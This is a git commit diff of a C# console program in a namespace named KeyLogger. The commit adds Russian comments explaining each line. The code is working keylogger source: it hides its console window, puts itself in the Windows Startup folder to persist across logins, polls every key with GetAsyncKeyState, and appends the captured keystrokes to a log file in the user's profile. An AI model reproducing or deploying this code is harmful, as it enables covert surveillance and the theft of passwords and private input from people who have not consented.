534a4260c70035534b81adffa0c60f0e3cd3b1c5
Anready <104269567+Anready@users.noreply.github.com>
2023-01-05 14:47:43 +0200

    Update Program.cs

--- ConsoleApp1/Program.cs
+++ ConsoleApp1/Program.cs
@@ -1,4 +1,4 @@
-﻿// by  ___________________________________________________________________________________________________
+// by  ___________________________________________________________________________________________________
 //    /                                                                                                   \
 //   /          /\         |\        | ----------    -----------        /\         ________     \        / \ 
 //   |         /  \        | \       | |         |   |                 /  \        |       \     \      /   |
@@ -38,27 +38,27 @@ namespace KeyLogger
         {
             ShowWindow(GetConsoleWindow(), SW_HIDE);
             int Keys = Enum.GetValues(typeof(Keys)).Length;
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\log.log";
-            string autostart = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\App.lnk";
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\log.log"; //Создаем переменную с путем к файлу log.log в который будем помещать наши нажатия
+            string autostart = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\App.lnk";//Создаем переменную с путем к автозагрузке
             Class1 t = new Class1();
-            t.Main(autostart, "App.exe");
+            t.Main(autostart, "App.exe"); // добавление в автозагрузку
             string _PKey = "";
 
             while (true)
             {
-                for (int i = 0; i < Keys; i++) if (GetAsyncKeyState(i) == -32767) _Key += Enum.GetName(typeof(Keys), i);
+                for (int i = 0; i < Keys; i++) if (GetAsyncKeyState(i) == -32767) _Key += Enum.GetName(typeof(Keys), i);//Считываем нажатия
 
-                if (_Key.Length <= 0) { Thread.Sleep(50); continue; }
+                if (_Key.Length <= 0) { Thread.Sleep(50); continue; }// если ничего не нажато, то пропускаем остальное
 
-                if (_Key.Equals("LButton")) { _Key = string.Empty; continue; }
+                if (_Key.Equals("LButton")) { _Key = string.Empty; continue; }//Пропускаем нажатие мыши
                 if (_Key.Equals("RButton")) { _Key = string.Empty; continue; }
-                if (_Key.Equals("Decimal")) { _Key = "."; }
+                if (_Key.Equals("Decimal")) { _Key = "."; }//Заменяем слово Decimal на точку
 
-                if (_Key == "D0" || _Key == "D1" || _Key == "D2" || _Key == "D3" || _Key == "D4" || _Key == "D5" || _Key == "D6" || _Key == "D7" || _Key == "D8" || _Key == "D9")
+                if (_Key == "D0" || _Key == "D1" || _Key == "D2" || _Key == "D3" || _Key == "D4" || _Key == "D5" || _Key == "D6" || _Key == "D7" || _Key == "D8" || _Key == "D9")//Есл цифра нажата в NumLK то убираем D
                 {
                     _Key = _Key.Replace("D", "");
                 }
-
+                //Переобразуем все остальное в читабельные названия
                 _Key = _Key.Replace("NumPad", "");
                 _Key = _Key.Replace("ShiftKeyLShiftKey", "Shift");
                 _Key = _Key.Replace("ShiftKeyRShiftKey", "Shift");
@@ -89,27 +89,26 @@ namespace KeyLogger
                 _Key = _Key.Replace("Subtract", "-");
                 _Key = _Key.Replace("Add", "+");
                 _Key = _Key.Replace("Enter", Environment.NewLine);
-
-                if(_PKey == "Shift" || _PKey == "Win" || _PKey == "Ctrl")
+                
+                if(_PKey == "Shift" || _PKey == "Win" || _PKey == "Ctrl")//Если прошлая кнопка равняется Shift Win или Ctrl то:
                 {
-                    if(_Key == "Shift" || _Key == "Win" || _Key == "Ctrl")
+                    if(_Key == "Shift" || _Key == "Win" || _Key == "Ctrl")//Проверяем если нажатая клавиша равняется Shift Win или Ctrl то пропускаем остальное
                     {
                         continue;
                     }
-                    _PKey = _Key;
-                    _Key = "+ " + _Key;
-                    Console.WriteLine(_Key);
-                    _Key = _Key.ToLower();
-                    _Key += " ";
-                    File.AppendAllText(path, _Key);
-                    _Key = string.Empty;
+                    _PKey = _Key; //записываем в _PKey нажатую клавишу
+                    _Key = "+ " + _Key; //Добавляем плюс к нажатой клавише что бы получилось так Win + l shift + alt
+                    _Key = _Key.ToLower();//Все к нижнему регистру
+                    _Key += " ";//доавляем пробел
+                    File.AppendAllText(path, _Key);//записуем в файл
+                    _Key = string.Empty;//чистим переменную
                     continue;
                 }
                 _PKey = _Key;
-                _Key = _Key.ToLower();
-                _Key += " ";
-                File.AppendAllText(path, _Key);
-                _Key = string.Empty;
+                _Key = _Key.ToLower();//Все к нижнему регистру
+                _Key += " ";//доавляем пробел
+                File.AppendAllText(path, _Key);//записуем в файл
+                _Key = string.Empty;//чистим переменную
             }
         }
     }
